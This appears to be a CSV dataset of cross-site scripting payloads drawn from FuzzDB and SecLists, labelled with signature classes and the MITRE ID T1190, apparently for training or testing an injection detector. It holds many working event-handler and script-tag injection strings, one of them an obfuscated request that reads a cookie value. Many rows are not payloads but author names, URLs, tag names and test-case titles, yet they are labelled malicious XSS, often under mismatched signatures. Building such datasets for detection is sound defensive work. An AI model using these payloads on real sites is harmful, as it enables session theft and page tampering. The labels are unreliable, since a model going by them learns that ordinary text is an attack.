Payload,Signature,AttackType,Severity,MITRE,Label,Description
<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\\/script%26gt;\\%26quot;%26quot;) autofocus></textarea>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
"<textarea onfocus=alert(""XSS"") autofocus>",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<textarea onfocus=alert('1') autofocus>,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<textarea onfocus=alert('XSS') autofocus>,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<textarea onfocus=alert('document.domain') autofocus>,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<textarea onfocus=alert(1) autofocus>,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload
<textarea onfocus=confirm('XSS') autofocus>,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<textarea onfocus=prompt('XSS') autofocus>,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<textarea type=""text"" cols=""50"" rows=""10""></textarea>//[""'`-->]]>]</div>",COMMAND_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<textarea/**/onfocus=alert('XSS')/**/autofocus>,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<textarea>jaVasCript:/*-/*`/*\\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e</textarea>",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
"<var onmouseover=""prompt(1)"">On Mouse Over</var>?",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
<video onloadstart=alert(1)><source>,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"<video src=_ onloadstart=""alert(1)"">",EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
<video/poster/onerror=alert(1)>,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<video><source onerror=""javascript:alert(1)"">",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<video><source onerror=alert(""XSS"")>",EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<video><source onerror=alert('1')>,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<video><source onerror=alert('XSS')>,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<video><source onerror=alert('document.domain')>,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<video><source onerror=alert(1)>,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload
<video><source onerror=confirm('XSS')>,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<video><source onerror=javascript:alert('XSS')>,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<video><source onerror=prompt('XSS')>,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
<video><source/**/onerror=alert('XSS')>,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"<w=""/x=""y>""/OndbLcLick=`<`[confir\\u006d``]>z",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x %6Fnxxx=1,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"<x '=""foo""><x foo='><img src=x onerror=alert(62)//'>",EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"<x 1=""1""onxxx=1",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"<x 1="">"" onxxx=1",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x 1='1'onxxx=1,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x </onxxx=1,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x contenteditable onblur=alert(1)>lose focus!,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x contenteditable onfocus=alert(1)>focus this!,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x contenteditable oninput=alert(1)>input here!,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x contenteditable onkeydown=alert(1)>press any key!,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x contenteditable onkeypress=alert(1)>press any key!,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x contenteditable onkeyup=alert(1)>press any key!,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x contenteditable onpaste=alert(1)>paste here!,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x o%6Exxx=1,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x on%78xx=1,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x onclick=alert(1)>click this!,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x oncontextmenu=alert(1)>right click this!,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x oncopy=alert(1)>copy this!,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x oncut=alert(1)>copy this!,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x ondblclick=alert(1)>double click this!,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x ondrag=alert(1)>drag this!,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x onmousedown=alert(1)>click this!,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x onmousemove=alert(1)>hover this!,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x onmouseout=alert(1)>hover this!,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x onmouseover=alert(1)>hover this!,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x onmouseup=alert(1)>click this!,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x onxxx%3D1,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x onxxx=1 onxxx=1,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x onxxx=alert(1) 1=',GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x%09onxxx=1,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x%0Aonxxx=1,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x%0Conxxx=1,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x%0Donxxx=1,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x%2Fonxxx=1,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<x/onxxx=1,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"<xml:namespace prefix=""t"">",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"<xsl:stylesheet id=""stylesheet"" version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"">",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"<xsl:template match=""/"">",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
>>> vectors(),GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
>test-->,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
"@font-face {font-family: y; src: url(""font.svg#x"") format(""svg"");} body {font: 100px ""y"";}",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
A very short cross browser header injection,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Add onclick event hadler,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Advanced HTML injection locator,COMMAND_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Advanced XSS Locator,COMMAND_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Advanced XSS Locator for title-Injections,COMMAND_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
At least 2 RFC mention the `;phone-context=` descriptor:,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
Author Name: -unknown-,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Author Name: .mario,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Author Name: DoctorDan,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Author Name: OWASP,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Author Name: PHPIDS Group,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Author Name: SIrDarckCat,COMMAND_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Author Name: ha.ckers.org,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Author Name: kishor,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Author Name: ma1,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Author Name: t3rmin4t0r,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Author Name: thespanner.co.uk,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Author Name: xs-sniper,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Author URL: http://sirdarckcat.net/,COMMAND_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
BASE,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
BGSOUND,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
BODY ONLOAD,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
BODY background-image,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Backslash-obfuscated XBL injection - variant 1,COMMAND_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Backslash-obfuscated XBL injection - variant 2,COMMAND_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Backslash-obfuscated XBL injection - variant 3,COMMAND_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Backslash-obfuscated XBL injection - variant 4,COMMAND_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Backslash-obfuscated XBL injection - variant 5,COMMAND_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Basic JS breaker,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Basic JS breaker variant 1,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Basic JS breaker variant 10,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Basic JS breaker variant 2,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Basic JS breaker variant 3,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Basic JS breaker variant 4,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Basic JS breaker variant 5,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Basic JS breaker variant 6,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Basic JS breaker variant 7,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Basic JS breaker variant 8,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Basic JS breaker variant 9,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Basic back ticked attribute breaker,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Basic double quoted attribute breaker,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Basic single quoted attribute breaker,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Basic title breaker,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Camouflaged comment injection with JS link,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Case Insensitive,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Character Encoding Example,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Closing JS Tag in JS String assignment,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Comment-breaker using obfuscated JavaScript,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Commented-out Block,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Conditional style injection for IE,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Content Replace,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Cookie Manipulation,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
DIV background-image 1,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
DIV background-image 2,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
DIV expression,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
DIV w/Unicode,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Double open angle brackets,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Dword Encoding,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Embed Flash,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Embedded Carriage Return,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Embedded Encoded Tab,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
Embedded Newline,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
